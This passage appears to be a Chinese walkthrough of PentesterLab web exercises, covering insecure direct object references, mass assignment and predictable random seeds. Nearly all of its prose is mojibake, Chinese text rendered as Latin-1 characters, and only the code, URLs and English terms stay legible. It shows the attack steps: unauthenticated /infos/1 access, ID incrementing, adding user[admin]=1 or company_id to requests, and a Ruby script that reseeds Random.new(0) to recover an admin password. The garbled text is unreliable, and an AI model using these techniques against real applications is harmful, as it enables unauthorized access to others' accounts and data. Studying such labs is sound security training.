æ³•çœŸæ­£æµ‹è¯•æˆæƒé—®é¢˜ï¼›è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®ƒé€šå¸¸æ˜¯æ¼æ´çš„è‰¯å¥½æ¥æºï¼Œå¹¶ä¸”äº†è§£å¦‚ä½•æµ‹è¯•å®ƒä»¬å¾ˆé‡è¦ã€‚ä¸‹é¢çš„â€œæ‰¹é‡åˆ†é…â€éƒ¨åˆ†ä¹Ÿæ˜¯ä¸€ä¸ªæˆæƒé—®é¢˜ï¼Œä½†ä¸ºäº†æ¸…æ¥šèµ·è§ï¼Œæˆ‘æ›´å–œæ¬¢å°†ç»ƒä¹ åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ã€‚ Example 1 é‚£æˆ‘ä»¬å…ˆç™»å½•ä¸€ä¸‹çœ‹çœ‹ å‘ç°äº†æœ‰å…³user1ç”¨æˆ·çš„ä¸¤ä¸ªéšç§ï¼Œæ ¹æ®é¢˜æ„æˆ‘ä»¬å¯ä»¥æ¢ä¸€ä¸ªå…¶ä»–æµè§ˆå™¨ï¼Œæˆ–è€…ç›´æ¥æ³¨é”€ç”¨æˆ·ï¼Œæ¥ç€ç›´æ¥è®¿é—®ä¸‹éšç§çš„urlåœ°å€ï¼Œçœ‹çœ‹æ˜¯å¦è¦æ±‚æˆ‘ä»¬è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯ã€‚ å¯è§æˆ‘ä»¬å¹¶æœªç™»å½•ï¼Œä½†ä»å¯ä»¥è®¿é—®uer1ç”¨æˆ·çš„éšç§ çœ‹ä¸€æ‰‹å®˜æ–¹è¯´æ˜ï¼š åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç”¨æˆ·ç™»å½•ï¼š user1 ï¼Œå¯†ç ä¸ºâ€œpentesterlabâ€ã€‚ç™»å½•å¹¶å°è¯•åï¼Œè¯·æ³¨é”€å¹¶å°è¯•è®¿é—®ç›¸åŒçš„ä¿¡æ¯ã€‚ å¯¹äºè®¾è®¡ä¸ä½³çš„ Web åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„é—®é¢˜ï¼Œå³ä½¿æ‚¨æ— æ³•è®¿é—®èº«ä»½éªŒè¯åé¡µé¢ï¼Œå¦‚æœæ‚¨çŸ¥é“å…¶ä»–é¡µé¢çš„ URLï¼Œæ‚¨ä»ç„¶å¯ä»¥è®¿é—®å…¶ä»–é¡µé¢ï¼šhttp://vulnerable/authorization/example1/infos/1ä¾‹å¦‚ã€‚ Example 2 è¦æ±‚æˆ‘ä»¬è®¿é—®user2çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å…ˆç™»é™†çœ‹çœ‹ è¿™é‡Œæœ‰ç‚¹æ‡µé€¼ï¼Œå¹¶ä¸çŸ¥é“è¦åšä»€ä¹ˆï¼Œçœ‹ä¸€æ‰‹å®˜æ–¹è§£é‡Š åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç”¨æˆ·ç™»å½•ï¼š `user1` ï¼Œå¯†ç ä¸º `pentesterlab` ã€‚ç™»å½•åï¼Œæ‚¨å¯ä»¥å¼€å§‹è®¿é—®ä¿¡æ¯å¹¶æŸ¥çœ‹ä½¿ç”¨çš„æ¨¡å¼ï¼š `/infos/1` ã€ `/infos/2` ã€‚å¦‚æœä¸æ–­å¢åŠ  URL ä¸­çš„æ•°å­—ï¼Œæ‚¨å°±å¯ä»¥è®¿é—®å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ã€‚ é‚£æˆ‘ä»¬ä¿®æ”¹çœ‹çœ‹ å¯è§æˆ‘ä»¬å¢åŠ urlåé¢çš„æ•°å­—ï¼Œå®ç°äº†æ°´å¹³è¶Šæƒ Example 3 æˆ‘ä»¬ç»§ç»­ç™»å½•çœ‹çœ‹ å¦‚ä¸Šå›¾ï¼Œå‘ç°å¤šäº†ä¸€ä¸ªeditç¼–è¾‘çš„åŠŸèƒ½ è¿™é‡Œæœ‰äº†ä¸Šä¸€å…³çš„ç»éªŒï¼Œæˆ‘æƒ³ç€ç›´æ¥ä¿®æ”¹æ•°å­—1çœ‹çœ‹ æœä¸å…¶ç„¶ï¼Œè¿™é‡Œæˆä¸ºäº†user2ç”¨æˆ· çœ‹ä¸€æ‰‹å®˜æ–¹è¯´æ˜ï¼š åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºå‰é¢çœ‹åˆ°çš„æ–¹æ³•æ¥è®¿é—®ä¿¡æ¯ã€‚æ‚¨ä¸èƒ½ç›´æ¥è®¿é—®ä¿¡æ¯ï¼Œä½†æ˜¯æ‚¨å¯ä»¥çœ‹åˆ°æ‚¨ç°åœ¨å¯ä»¥ç¼–è¾‘ä¿¡æ¯ï¼Œå¹¶ä¸”æ‚¨å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½ä»…é€šè¿‡å¢åŠ  URL ä¸­çš„æ•°å­—æ¥è®¿é—®å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯ã€‚ 0x06 Mass Assignment-è¦†ç›–å±æ€§ å®˜æ–¹è¯´æ˜ï¼š å½“äººä»¬å¼€å§‹ä½¿ç”¨æ•°æ®åº“æ¥å­˜å‚¨ä¿¡æ¯æ¥æ„å»ºç½‘ç«™æ—¶ï¼Œä»–ä»¬å¿…é¡»æ‰‹åŠ¨æ‰§è¡Œå¤§é‡ SQLã€‚å¾ˆå°‘æœ‰äººæ„è¯†åˆ°è¿™ä¸æ˜¯æœ€å¥½çš„è§£å†³æ–¹æ¡ˆï¼Œå¹¶å¼€å§‹ç ”ç©¶æ›´æ™ºèƒ½çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå¹¶å¼€å§‹æ„å»ºå¯¹è±¡å…³ç³»æ˜ å°„ (ORM)ï¼Œä»¥ä¾¿åœ¨æ²¡æœ‰ä»»ä½• SQL çŸ¥è¯†çš„æƒ…å†µä¸‹è½»æ¾æŸ¥è¯¢æ•°æ®åº“ã€‚ä¾‹å¦‚ï¼Œåœ¨ Rubyï¼ˆä½¿ç”¨ ActiveRecordï¼‰ä¸­ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š @user = User.find_by_name('pentesterlab') è¿™å°†è‡ªåŠ¨ç”Ÿæˆå¹¶æ‰§è¡ŒæŸ¥è¯¢ï¼Œå¹¶åœ¨ User å¯¹è±¡ä¸­æ£€ç´¢ç»“æœã€‚ å¦ä¸€ä¸ªéå¸¸æ–¹ä¾¿çš„ç”¨æ³•æ˜¯ä»å“ˆå¸Œè‡ªåŠ¨åˆ›å»ºå’Œæ›´æ–°å¯¹è±¡ï¼š @user = User.create(myhash) [...] @user.update_attributes(anotherhash) ä¸å¹¸çš„æ˜¯ï¼Œè¿™ä¸ªæœ‰ç”¨çš„åŠŸèƒ½æ˜¯æœ‰å®‰å…¨ä»£ä»·çš„ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰æ­£ç¡®ç¡®ä¿å¯¹è±¡ @user çš„å±æ€§å—åˆ°ä¿æŠ¤ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä»»æ„è¦†ç›–è¿™äº›å±æ€§ä¸­çš„ä»»ä½•ä¸€ä¸ªã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°æ­¤ç±»é—®é¢˜çš„ä¸€äº›å¸¸è§ç¤ºä¾‹ï¼š è¦†ç›–å±æ€§ Example 1 è¿™é‡Œä¾æ—§æ˜¯ä¸€è„¸æ‡µçš„ï¼Œè¿˜æ˜¯çœ‹ä¸€æ‰‹å®˜æ–¹è§£é‡Šå§ åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥æ³¨å†Œä¸€ä¸ªç”¨æˆ·ã€‚è¯¥åº”ç”¨ç¨‹åºæœ‰ä¸¤ä¸ªçº§åˆ«çš„æƒé™ï¼š User. Admin. ç®¡ç†å‘˜æƒé™æ˜¯ä½¿ç”¨å¯¹è±¡ user ä¸Šçš„å±æ€§ admin è®¾ç½®çš„ã€‚å¦‚æœæ‚¨ä»”ç»†è§‚å¯Ÿ Web åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ ¼å¼ï¼š user[username] å’Œ user[password] ï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿæ‰¾åˆ°ä¸€ç§è·å– admin è®¿é—®æƒé™çš„æ–¹æ³•ã€‚å¯ä»¥ä½¿ç”¨ä¸‰ç§æ–¹æ³•ï¼š ä½¿ç”¨æµè§ˆå™¨æ‰©å±•ç›´æ¥ä¿®æ”¹é¡µé¢ã€‚ ä¿å­˜é¡µé¢å¹¶ç¦»çº¿ä¿®æ”¹ä»¥åˆ›å»ºä¸€ä¸ªé¡µé¢ï¼Œè¯¥é¡µé¢å°†æ­£ç¡®çš„è´Ÿè½½å‘é€åˆ°æ­£ç¡®çš„ URLã€‚ ä½¿ç”¨ä»£ç†æ‹¦æˆªåˆæ³•è¯·æ±‚å¹¶æ·»åŠ æ‚¨çš„å‚æ•°ï¼ˆæœ€å¿«çš„é€‰é¡¹ï¼‰ã€‚ ä¸€å¼€å§‹çœ‹è¿™ä¸ªè§£é‡Šå¹¶ä¸æ¸…æ¥šæ˜¯å¹²å˜›çš„ï¼Œäºæ˜¯çœ‹äº†å¸ˆå‚…ä»¬çš„wpæ‰ç†è§£ã€‚æ ¹æ®ä¹‹å‰å®˜æ–¹çš„è§£é‡Šï¼Œè¿™é‡Œææœ‰å¯èƒ½æ˜¯æœåŠ¡å™¨ä¼šå¯¹ç”¨æˆ·åœ¨urlè¾“å…¥çš„å†…å®¹è¿›è¡Œæ£€ç´¢ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹æ•°æ®ç»“æ„ å¯ä»¥çœ‹åˆ°æ˜¯user[username]ä¸user[password]ç»“æ„ï¼Œè¿™æ„å‘³ç€æœåŠ¡å™¨å°±æ˜¯é€šè¿‡æ£€ç´¢urlä¸­userä¸­é”®å€¼åä¸ºusernameä¸passwordå¯¹åº”çš„å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°è¯•åœ¨urlä¸­æ·»åŠ ï¼šuser[admin]çš„å‚æ•°ã€‚ å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œæˆ‘æ·»åŠ äº†user[admin]=1ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸè¶Šæƒ Example 2 è¿™é‡Œç›®çš„ç›¸åŒï¼Œä¸è¿‡æˆ‘ä»¬åœ¨åˆ›å»ºçš„æ—¶å€™æ— æ³•æ·»åŠ adminå±æ€§äº† ä½†è¿™é‡Œå¤šäº†ä¸€ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ›´æ–° åœ¨æ­¤urlä¸‹æˆ‘ä»¬ç»§ç»­æäº¤çœ‹çœ‹ å‘ç°è¿™é‡Œå˜æˆæ›´æ–°äº†ï¼Œé‚£æˆ‘ä»¬æœ‰ç†ç”±ç›¸ä¿¡ï¼Œè¿™ä½å¼€å‘äººå‘˜åªåœ¨ç™»å½•çš„æ—¶å€™è¿›è¡Œäº†é™åˆ¶ï¼Œä½†å…¶ä»–æ¥å£å¿˜è®°ä¿®æ”¹äº†ã€‚é‚£è¿™æ ·çš„è¯æˆ‘ä»¬åœ¨æ­¤å°è¯•æ·»åŠ adminå±æ€§çœ‹çœ‹ æˆåŠŸè¶Šæƒ Example 3 æˆ‘ä»¬å…ˆå°è¯•ç™»å½• è¿™é‡Œè¯´å…¬å¸ä¸€çš„ç”¨æˆ·æ˜¯æ— æƒè®¿é—®å…¬å¸2çš„ç§˜å¯†çš„ï¼Œä½†è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªmodifyçš„æ–°åŠŸèƒ½ï¼Œä¸å‡ºæ‰€æ–™è¿™é‡Œæˆ–è®¸æ˜¯æ¼æ´æ‰€åœ¨ç‚¹ æˆ‘ä»¬ç‚¹å‡»åœ¨è¾“å…¥æ¡†è¾“å…¥ä¿¡æ¯åå‘ç°urlæˆä¸ºäº†updateprofileï¼Œé‚£å¤§æ¦‚ç‡å¦‚æœæˆ‘ä»¬åœ¨æ­¤æ·»åŠ ä¸€äº›å±æ€§ï¼Œä¹Ÿè®¸å°±å¯ä»¥ç»•è¿‡ï¼Œä½†æˆ‘æµ‹è¯•äº†å‡ ç•ªå‘ç°æ€»æ˜¯é”™è¯¯ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å®˜æ–¹è¯´æ˜ï¼š åœ¨æœ¬ç»ƒä¹ ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç”¨æˆ·ç™»å½•ï¼š user1 ï¼Œå¯†ç ä¸º pentesterlab ã€‚ç™»å½•åï¼Œå°è¯•è®¿é—®â€œCompany 2â€å…¬å¸çš„ä¿¡æ¯ã€‚ ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨æ‰¹é‡åˆ†é…æ¥ä¿®æ”¹æ‚¨çš„å…¬å¸ã€‚ æŒ‰ç…§çº¦å®šï¼ˆå¯ä»¥é€šè¿‡ç¼–ç¨‹æ–¹å¼æ›´æ”¹ï¼‰ï¼Œå½“å¼€å‘äººå‘˜ä½¿ç”¨ ActiveRecordï¼ˆRuby-on-Rails æœ€å¸¸è§çš„æ•°æ®æ˜ å°„å™¨ï¼‰å¹¶ä¸”ç±» Company å…·æœ‰å¤šä¸ª User æ—¶ï¼Œå…³ç³»å°†å—åˆ°ç®¡ç†åœ¨ User ç±»ä¸­çš„å­—æ®µ company_id ï¼š åœ¨ Ruby ä¸­ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼š class User &lt; ActiveRecord::Base belongs_to :company end class Company &lt; ActiveRecord::Base has_many :users end Ruby-on-Rails å¼ºåˆ¶æ‰§è¡Œâ€œçº¦å®šâ€è€Œä¸æ˜¯â€œé…ç½®â€ï¼Œè¿™ç¡®å®æœ‰åŠ©äºçŒœæµ‹ç±»åç§°å’Œå±æ€§åç§°...... ä½¿ç”¨æ­¤ä¿¡æ¯ï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿä¿®æ”¹æ‚¨å½“å‰çš„å…¬å¸ä»¥è·å–å…¶ä»–å…¬å¸çš„â€œç§˜å¯†â€ã€‚è·å¾—æ­¤â€œç§˜å¯†â€åï¼Œæ‚¨å¯ä»¥é‡ç½® company_id ä»¥è¿”å›æ‚¨å…¬å¸çš„è¯¦ç»†ä¿¡æ¯ã€‚ é™„ä¸ŠGPTå¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Š è¿™æ®µ Ruby ä»£ç å±•ç¤ºäº†ä¸¤ä¸ª ActiveRecord æ¨¡å‹ç±»ï¼Œåˆ†åˆ«æ˜¯ `User` å’Œ `Company`ã€‚ActiveRecord æ˜¯ Ruby on Rails ä¸­çš„ ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶ï¼Œç”¨äºåœ¨ Ruby ä¸­æ“ä½œæ•°æ®åº“ã€‚ 1. User æ¨¡å‹ç±»: ```ruby class User &lt; ActiveRecord::Base belongs_to :company end ``` - `User` ç±»ç»§æ‰¿è‡ª `ActiveRecord::Base`ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ª ActiveRecord æ¨¡å‹ã€‚ - `belongs_to :company` è¡¨æ˜ `User` æ¨¡å‹å±äºï¼ˆå…³è”åˆ°ï¼‰`Company` æ¨¡å‹ã€‚è¿™æ˜¯ä¸€å¯¹å¤šå…³ç³»çš„ä¸€ç«¯ï¼Œå³ä¸€ä¸ªå…¬å¸å¯ä»¥æœ‰å¤šä¸ªç”¨æˆ·ï¼Œè€Œæ¯ä¸ªç”¨æˆ·åªå±äºä¸€ä¸ªå…¬å¸ã€‚ 2. Company æ¨¡å‹ç±»: ```ruby class Company &lt; ActiveRecord::Base has_many :users end ``` - `Company` ç±»åŒæ ·ç»§æ‰¿è‡ª `ActiveRecord::Base`ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ª ActiveRecord æ¨¡å‹ã€‚ - `has_many :users` è¡¨æ˜ `Company` æ¨¡å‹æ‹¥æœ‰ï¼ˆå…³è”åˆ°ï¼‰å¤šä¸ª `User` æ¨¡å‹ã€‚è¿™æ˜¯ä¸€å¯¹å¤šå…³ç³»çš„å¤šç«¯ï¼Œå³ä¸€ä¸ªå…¬å¸å¯ä»¥æ‹¥æœ‰å¤šä¸ªç”¨æˆ·ã€‚ è¿™ä¸¤ä¸ªç±»çš„å®šä¹‰åæ˜ äº†æ•°æ®åº“ä¸­ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å…³ç³»ã€‚é€šå¸¸ï¼Œè¿™ç§å…³ç³»è¢«ç§°ä¸º \"ä¸€å¯¹å¤š\"ï¼ˆOne-to-Manyï¼‰å…³ç³»ï¼Œå…¶ä¸­ä¸€ä¸ªå¯¹è±¡ï¼ˆCompanyï¼‰å¯ä»¥å…³è”åˆ°å¤šä¸ªå…¶ä»–å¯¹è±¡ï¼ˆUsersï¼‰ï¼Œè€Œè¿™äº›å…¶ä»–å¯¹è±¡ï¼ˆUsersï¼‰åªèƒ½å±äºä¸€ä¸ªç‰¹å®šçš„å¯¹è±¡ï¼ˆCompanyï¼‰ã€‚ åœ¨ Rails ä¸­ï¼Œè¿™æ ·çš„å…³è”å…³ç³»è¿˜å¯ä»¥å¸¦æ¥ä¸€äº›ä¾¿æ·çš„æ–¹æ³•ï¼Œæ¯”å¦‚é€šè¿‡ `company.users` å¯ä»¥è·å–ä¸æŸä¸ªå…¬å¸å…³è”çš„æ‰€æœ‰ç”¨æˆ·ï¼Œé€šè¿‡ `user.company` å¯ä»¥è·å–æŸä¸ªç”¨æˆ·æ‰€å±çš„å…¬å¸ã€‚è¿™äº›å…³è”å…³ç³»å¯ä»¥æ–¹ä¾¿åœ°è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢å’Œæ“ä½œï¼Œéµå¾ª Rails çš„çº¦å®šä¼˜äºé…ç½®ï¼ˆConvention over Configurationï¼‰åŸåˆ™ã€‚ ä½†æ­¤å¤„çš„å½“å¼€å‘äººå‘˜ä½¿ç”¨ ActiveRecordï¼ˆRuby-on-Rails æœ€å¸¸è§çš„æ•°æ®æ˜ å°„å™¨ï¼‰è¿™ä¸ªæ˜ å°„å™¨æˆ‘ä»¬ä»ä½•éªŒè¯å‘¢ï¼Œåªéœ€è¦ä¸€ä¸ªå°æ’ä»¶å³å¯ æ€»ç»“ï¼šå› ä¸ºåœ¨ä¸€å¯¹å¤šçš„ç»“æ„ä¸­ï¼Œå³ä¸€ä¸ªcompanyå¯¹åº”å¤šä¸ªuserï¼Œé‚£ä¹ˆåœ¨userè¡¨ä¸­ä¼šå¤šä¸€ä¸ªcompany_idçš„å¤–é”®æŒ‡å‘companyè¡¨ã€‚ è¿™ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä»åˆšæ‰çš„é¡µé¢æ·»åŠ ä¸€ä¸ªcompan_idçš„å±æ€§å³å¯ï¼Œè€Œä¹‹å‰æˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™æ·»åŠ çš„æ˜¯companyå±æ€§ å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æˆåŠŸè¯»å–å…¬å¸ä¸€çš„ç§˜å¯† 0x07 Randomness Issues-éšæœºæ€§é—®é¢˜ å®˜æ–¹è¯´æ˜ï¼š æ ¹æ®å¼€å‘äººå‘˜ç”Ÿæˆéšæœºæ•°æˆ–å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œæ‰€åˆ›å»ºçš„å€¼æˆ–å¤šæˆ–å°‘éƒ½æ˜¯éšæœºçš„ã€‚æœ€å¤§çš„é”™è¯¯ä¾¿æ˜¯ä½¿ç”¨å¸¸é‡æˆ–å½“å‰æ—¶é—´æ‰‹åŠ¨è®¾ç½®éšæœºç”Ÿæˆå™¨;è¿™å°†å…è®¸æ”»å‡»è€…èƒ½å¤Ÿé¢„æµ‹å·²ç»å’Œå°†è¦ç”Ÿæˆçš„å€¼ã€‚ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°ä¸€äº›ç¤ºä¾‹ï¼Œè¿™äº›ç¤ºä¾‹å°†ä½¿æ‚¨ç›¸ä¿¡éšæœºå¹¶ä¸æ€»æ˜¯éšæœºçš„ã€‚ Example 1 é™„ä¸ŠGPTå¯¹ä¸Šè¿°ä»£ç çš„è§£é‡Šï¼š è¿™æ®µ Ruby ä»£ç ä¸»è¦æ¶‰åŠéšæœºå¯†ç ç”Ÿæˆå’Œåˆ›å»ºç”¨æˆ·çš„æ“ä½œï¼ŒåŒæ—¶ä½¿ç”¨äº† MD5 å“ˆå¸Œæ¥å­˜å‚¨å¯†ç ã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„è¯¦ç»†è§£é‡Šï¼š 1. **`Random.new(0)`**: åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å¯¹è±¡ï¼Œå¹¶ä½¿ç”¨ç§å­å€¼ `0` è¿›è¡Œåˆå§‹åŒ–ã€‚è¿™ä¸ªå¯¹è±¡å°†ç”¨äºç”Ÿæˆå¯†ç ä¸­çš„éšæœºå­—ç¬¦ã€‚ 2. **`6.times.map {...}.join`**: è¿™ä¸ªéƒ¨åˆ†ç”Ÿæˆäº†ä¸€ä¸ªåŒ…å« 6 ä¸ªéšæœºå°å†™å­—æ¯çš„å­—ç¬¦ä¸²ã€‚å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š - `6.times`: è¡¨ç¤ºå¾ªç¯ 6 æ¬¡ã€‚ - `map {...}`: å¯¹æ¯æ¬¡å¾ªç¯åº”ç”¨èŠ±æ‹¬å·ä¸­çš„ä»£ç å—ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨æ•°ç»„ä¸­ã€‚ - `('a'..'z').to_a`: åˆ›å»ºåŒ…å«å°å†™å­—æ¯ 'a' åˆ° 'z' çš„æ•°ç»„ã€‚ - `s.rand(('a'..'z').to_a.size)`: ç”Ÿæˆä¸€ä¸ªä»‹äº 0 å’Œæ•°ç»„å¤§å°ä¹‹é—´çš„éšæœºæ•°ã€‚ - æ•´ä½“æ¥è¯´ï¼Œ`('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]` ä¼šéšæœºé€‰æ‹©æ•°ç»„ä¸­çš„ä¸€ä¸ªå­—æ¯ã€‚ - `.join`: å°†æ•°ç»„ä¸­çš„å…ƒç´ æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ 3. **`Digest::MD5.hexdigest(SEED+pass+SEED)`**: ä½¿ç”¨ MD5 å“ˆå¸Œç®—æ³•å¯¹å¯†ç è¿›è¡Œå“ˆå¸Œã€‚`Digest::MD5.hexdigest` å°†ç”Ÿæˆä¸€ä¸ª 32 ä½çš„åå…­è¿›åˆ¶å“ˆå¸Œå€¼ã€‚`SEED` æ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„å¸¸é‡ï¼Œè¢«æ‹¼æ¥åˆ°å¯†ç çš„å‰åï¼Œè¿™æ ·å¯ä»¥å¢åŠ å“ˆå¸Œçš„å®‰å…¨æ€§ï¼Œé˜²æ­¢å½©è™¹è¡¨ç­‰æ”»å‡»ã€‚ 4. **`User.create(...)`**: ä½¿ç”¨ ActiveRecord æ¨¡å‹ `User` çš„ `create` æ–¹æ³•åˆ›å»ºç”¨æˆ·ã€‚å…·ä½“è§£é‡Šå¦‚ä¸‹ï¼š - `:username =&gt; 'admin'`: æŒ‡å®šç”¨æˆ·åä¸º 'admin'ã€‚ - `:password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)`: æŒ‡å®šå¯†ç ä¸ºé€šè¿‡ MD5 å“ˆå¸Œå¤„ç†çš„éšæœºç”Ÿæˆçš„å¯†ç ã€‚ 5. **`pass = 6.times.map {...}.join`**: ç”Ÿæˆå¦ä¸€ä¸ª 6 ä½çš„éšæœºå¯†ç ï¼Œç”¨äºåˆ›å»ºç¬¬äºŒä¸ªç”¨æˆ·ã€‚ 6. **`User.create(...)`**: åˆ›å»ºç¬¬äºŒä¸ªç”¨æˆ·ï¼Œç”¨æˆ·åä¸º 'hacker'ï¼Œå¯†ç åŒæ ·æ˜¯é€šè¿‡ MD5 å“ˆå¸Œå¤„ç†çš„éšæœºç”Ÿæˆçš„å¯†ç ã€‚ æ€»ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç ç”¨äºåˆ›å»ºä¸¤ä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªç”¨æˆ·åä¸º 'admin'ï¼Œå¦ä¸€ä¸ªç”¨æˆ·åä¸º 'hacker'ï¼Œå¹¶ä¸ºè¿™ä¸¤ä¸ªç”¨æˆ·ç”Ÿæˆéšæœºå¯†ç ï¼Œé€šè¿‡ MD5 å“ˆå¸Œå­˜å‚¨å¯†ç ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œä½¿ç”¨æ›´å¼ºå¤§çš„å¯†ç å“ˆå¸Œç®—æ³•ï¼ˆå¦‚ bcryptï¼‰é€šå¸¸æ˜¯æ›´å®‰å…¨çš„é€‰æ‹©ã€‚æ­¤å¤–ï¼Œç¡¬ç¼–ç çš„å¯†ç å’Œç§å­å€¼å¯èƒ½ä¸æ˜¯æœ€ä½³å®è·µï¼Œæ›´å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨æ›´éšæœºå’Œæ›´é•¿çš„å¯†ç ä»¥åŠçœŸæ­£çš„éšæœºæ•°ç”Ÿæˆå™¨ã€‚ ä¹Ÿå°±æ˜¯è¯´è¿™é‡Œé¢ç”¨æˆ·çš„å¯†ç æ˜¯éšæœºç”Ÿæˆçš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ä¸­çš„éšæœºæ•°ç§å­s=Random.new(0)ä¼¼ä¹å¹¶ä¸å®‰å…¨ï¼Œè¿™é‡Œä»¥0ä¸ºéšæœºæ•°ç§å­ï¼Œè¿™ä»£è¡¨ç€æ­¤å¤„çš„sä¸€å®šæ˜¯å®šå€¼ï¼Œå¹¶ä¸”åœ¨è¿›è¡Œmd5åŠ å¯†æ—¶ï¼Œé‡‡ç”¨äº†é¢„å®šä¹‰å¸¸é‡MD5.hexdigest(SEED+pass+SEED))SEED æˆ‘ä»¬çœ‹ä¸€ä¸‹å®˜æ–¹è¯´æ˜ï¼š ç¬¬ä¸€ä¸ªä¾‹å­åªæ˜¯ä¸ºäº†è¯´æ˜éšæœºæ€§å¹¶ä¸æ˜¯çœŸæ­£çš„éšæœºæ€§ã€‚é—®é¢˜æ¥è‡ªäºç§å­éšæœºç”Ÿæˆå™¨çš„ä½¿ç”¨ã€‚å¼€å‘äººå‘˜ä½¿ç”¨å€¼ 0 æ¥ä¸ºéšæœºç”Ÿæˆå™¨æä¾›ç§å­ã€‚ å¦‚æœæ‚¨åªæ˜¯é‡æ–°æ‰§è¡Œè¯¥è„šæœ¬ï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿæ‰¾åˆ°ä¸ºç®¡ç†å‘˜ admin ç”Ÿæˆçš„å¯†ç ã€‚ ä¹‹åçœ‹äº†å‡ ä¸ªwpå‘ç°ç›´æ¥è¿è¡Œæ­¤ä»£ç å³å¯ s = Random.new(0) pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join puts pass pass = 6.times.map { ('a'..'z').to_a[s.rand(('a'..'z').to_a.size)]}.join puts pass ä½†ä»¤æˆ‘ç–‘æƒ‘çš„æ˜¯password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)æ­¤å¤„çš„passwordèµ·åˆ°äº†ä»€ä¹ˆä½œç”¨å•Šã€‚éš¾é“ä¸åº”è¯¥æ˜¯puts passwordå—ï¼Ÿäºæ˜¯é—®äº†GPTï¼Œè¿™é‡Œé™„ä¸Šè§£é‡Šï¼š æ˜¯çš„ï¼Œä½ ç†è§£å¾—å¾ˆå¯¹ã€‚åœ¨è¿™æ®µ Ruby ä»£ç ä¸­ï¼Œ`password =&gt; Digest::MD5.hexdigest(SEED+pass+SEED)` ä¸­çš„ `password` åªæ˜¯ç”¨äºå­˜å‚¨å¯†ç çš„å­—æ®µï¼Œå®é™…å­˜å‚¨çš„æ˜¯é€šè¿‡ MD5 å“ˆå¸Œç®—æ³•å¤„ç†è¿‡çš„å¯†ç çš„ç»“æœï¼Œè€Œä¸æ˜¯ç”¨æˆ·çœŸæ­£çš„æ˜æ–‡å¯†ç ã€‚ åœ¨å…¸å‹çš„å®‰å…¨å®è·µä¸­ï¼Œç”¨æˆ·çš„å¯†ç æ˜¯ä¸ç›´æ¥ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„ï¼Œè€Œæ˜¯é€šè¿‡å“ˆå¸Œç®—æ³•åŠ ç›å¤„ç†åå­˜å‚¨ã€‚è¿™æ ·å³ä½¿æ•°æ®åº“æ³„æ¼ï¼Œæ”»å‡»è€…ä¹Ÿä¸èƒ½è½»æ˜“è·å–ç”¨æˆ·çš„çœŸå®å¯†ç 